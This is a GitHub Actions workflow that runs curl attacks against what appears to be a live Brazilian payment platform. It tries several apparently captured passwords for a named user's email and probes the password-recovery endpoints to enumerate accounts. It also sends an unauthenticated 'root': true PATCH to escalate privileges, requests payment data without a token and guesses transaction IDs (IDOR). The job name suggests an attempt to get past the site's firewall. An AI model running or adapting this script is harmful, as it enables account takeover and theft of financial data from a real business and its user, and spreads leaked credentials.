name: waf-whitlabel-investigate
on:
  workflow_dispatch:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - name: Investigate whitelabel login and theme
      run: |
        UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        BASE="https://wpdataservice.wisepay.com.br"
        
        echo "IP: $(curl -s https://api.ipify.org)"
        
        echo ""
        echo "=== /users/theme COM Origin petcenterbrasil ==="
        curl -s -m 15 -A "$UA" \
          -H "Origin: https://petcenterbrasil.wisepay.com.br" \
          -H "type-application: web" \
          "$BASE/users/theme" \
          -w "\nSTATUS:%{http_code}"
        
        echo ""
        echo "=== POST /login fabiane + todas as senhas capturadas ==="
        for CRED in "fabiane@petcenterbrasil.com.br:08710871" "fabiane@petcenterbrasil.com.br:67896789" "fabiane@petcenterbrasil.com.br:12341234" "fabiane@petcenterbrasil.com.br:granada2347" "fabiane.br:12341234"; do
          EMAIL="${CRED%%:*}"
          PASS="${CRED##*:}"
          RESP=$(curl -s -m 15 -A "$UA" \
            -H "Content-Type: application/json" \
            -H "Origin: https://portal.wisepay.com.br" \
            -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
            -H "type-application: web" \
            -X POST "$BASE/login" \
            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
            -w "\n%{http_code}")
          CODE=$(echo "$RESP" | tail -1)
          BODY=$(echo "$RESP" | head -1)
          echo "$CODE $EMAIL:$PASS | $(echo $BODY | head -c 200)"
        done
        
        echo ""
        echo "=== POST /login/password-recover (email temporário) ==="
        curl -s -m 15 -A "$UA" \
          -H "Content-Type: application/json" \
          -H "type-application: web" \
          -H "Origin: https://portal.wisepay.com.br" \
          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
          -X POST "$BASE/login/password-recover" \
          -d '{"email":"fabiane@petcenterbrasil.com.br"}' \
          -w "\nSTATUS:%{http_code}"
        
        echo ""
        echo "=== POST /login/password-recover (email inventado) ==="
        curl -s -m 15 -A "$UA" \
          -H "Content-Type: application/json" \
          -H "type-application: web" \
          -H "Origin: https://portal.wisepay.com.br" \
          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
          -X POST "$BASE/login/password-recover" \
          -d '{"email":"usuario.inventado.xyz999@gmail.com"}' \
          -w "\nSTATUS:%{http_code}"
        
        echo ""
        echo "=== P0: PATCH /users sem token (mass assignment test) ==="
        curl -s -m 15 -A "$UA" \
          -H "Content-Type: application/json" \
          -H "type-application: web" \
          -X PATCH "$BASE/users/1/edit" \
          -d '{"root": true}' \
          -w "\nSTATUS:%{http_code}"
        
        echo ""
        echo "=== GET /pagamentos sem token ==="
        curl -s -m 15 -A "$UA" \
          -H "type-application: web" \
          "$BASE/pagamentos" \
          -w "\nSTATUS:%{http_code}"
        
        echo ""
        echo "=== P1-3: GET /checkout/status (IDOR sem auth) ==="
        for tid in "WP000001" "W0000001" "00000001" "123456"; do
          CODE=$(curl -s -m 10 -A "$UA" \
            -H "type-application: web" \
            "$BASE/checkout/status/$tid" \
            -w "%{http_code}" -o /dev/null)
          echo "$CODE $tid"
        done
